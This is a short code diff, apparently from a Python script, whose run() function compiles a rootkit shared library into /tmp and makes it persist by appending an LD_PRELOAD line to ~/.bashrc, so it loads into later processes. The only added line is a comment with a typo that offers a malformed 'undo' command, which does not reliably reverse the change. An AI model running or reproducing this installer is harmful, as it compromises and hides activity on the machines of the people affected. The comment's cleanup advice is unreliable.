@@ -35,6 +35,7 @@ def run():
     # subprocess.run("export LD_PRELOAD=./utils/rootkit.so ps", shell=True)
     subprocess.run("gcc -fPIC -shared -o /tmp/rootkit.so ./utils/rootkit.c -ldl" , shell=True)
     subprocess.run("chmod 755 /tmp/rootkit.so" , shell=True)
+    # This lune unmesses the computer: echo 'export LD_PRELOAD=>> ~/.bashrc && . ~/.bashrc'
     subprocess.run("echo 'export LD_PRELOAD=/tmp/rootkit.so' >> ~/.bashrc && . ~/.bashrc" , shell=True)
     
     time.sleep(1)
